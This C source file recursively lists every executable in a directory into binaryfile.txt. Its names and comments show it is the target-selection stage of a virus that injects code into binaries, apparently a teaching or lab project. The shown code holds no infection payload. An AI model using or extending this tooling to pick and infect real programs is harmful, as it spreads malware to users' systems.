#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <ftw.h>
#include <stdio.h>
#include <unistd.h>

// to avoid following files while listing all the
// binary files present in the current directory

#define scannercode "./scanner"
#define binaryfile "./binaryfile"
#define sourcetoinjectcode "./virus" 
#define viruscode "./hello"

// File to contain list of binary files
static FILE* F;

// Creates list of binary files except ./virus and ./hello
// ./scanner and ./createsBinaryFilesList in the current directory
int list(const char *name, const struct stat *status, int type);

int main(int argc, char *argv[]) 
{
	F= fopen("./binaryfile.txt", "w");
	if(F == NULL)
	{
		perror("File not openable");
		return EXIT_FAILURE;
	}
	if(argc == 1)
		ftw(".", list, 1);
	else
		ftw(argv[1], list, 1);
	fclose(F);
	return 0;
}

int list(const char *name, const struct stat *status, int type) 
{
	if(type == FTW_NS)
		return 0;
	if(type == FTW_F)
	{
		if(status->st_mode & 0111)
		{
			if(strncmp(name,sourcetoinjectcode,strlen(name))!=0 && (strncmp(name,viruscode,strlen(name)) != 0) && (strncmp  			  (name,scannercode,strlen(name))!= 0) && (strncmp(name,binaryfile,strlen(name))!= 0))
			fprintf(F,"%s\n",name);
		}
	}


	return 0;
}
